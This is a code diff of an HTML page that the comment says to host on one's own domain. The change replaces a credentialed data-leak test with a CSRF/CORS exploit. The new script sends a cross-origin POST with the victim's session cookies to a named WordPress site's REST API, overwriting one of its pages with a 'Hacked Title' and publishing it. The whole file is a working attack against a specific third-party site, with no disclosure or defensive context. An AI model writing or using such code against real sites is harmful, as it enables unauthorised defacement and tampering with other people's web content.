@@ -1,29 +1,34 @@
+<!-- Save as cors-exploit.html and host it on your domain -->
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>CORS Cache Poisoning Exploit Demo</title>
+  <title>Page Update Exploit</title>
 </head>
 <body>
-  <h1>Trying to Leak Data from Vulnerable Site</h1>
-  <button id="fetchBtn">Fetch Sensitive Data</button>
-  <pre id="output" style="white-space: pre-wrap; background:#eee; padding:10px; margin-top:10px;"></pre>
+  <h2>Click to Inject Page Content</h2>
+  <button onclick="exploit()">Inject Page</button>
+  <pre id="result" style="background:#eee;padding:10px;"></pre>
 
   <script>
-    document.getElementById('fetchBtn').onclick = function() {
-      fetch('https://lahanparagon.edu.np/wp-json/oembed/1.0/embed', {
-        method: 'GET',
-        credentials: 'include' // send cookies if any
+    function exploit() {
+      fetch('https://lahanparagon.edu.np/wp-json/wp/v2/pages/271', {
+        method: 'POST',
+        credentials: 'include', // send session cookies
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          title: 'Hacked Title',
+          content: '<h1>Modified via External Host</h1>',
+          status: 'publish'
+        })
       })
-      .then(response => {
-        if (!response.ok) throw new Error('Network response was not ok: ' + response.status);
-        return response.text(); // or response.json() if JSON expected
-      })
+      .then(res => res.json())
       .then(data => {
-        document.getElementById('output').textContent = '✅ Data received:\n\n' + data;
+        document.getElementById('result').textContent = '✅ Success:\n' + JSON.stringify(data, null, 2);
       })
-      .catch(error => {
-        document.getElementById('output').textContent = '❌ Fetch error:\n\n' + error.message;
+      .catch(err => {
+        document.getElementById('result').textContent = '❌ Error:\n' + err.message;
       });
     }
   </script>
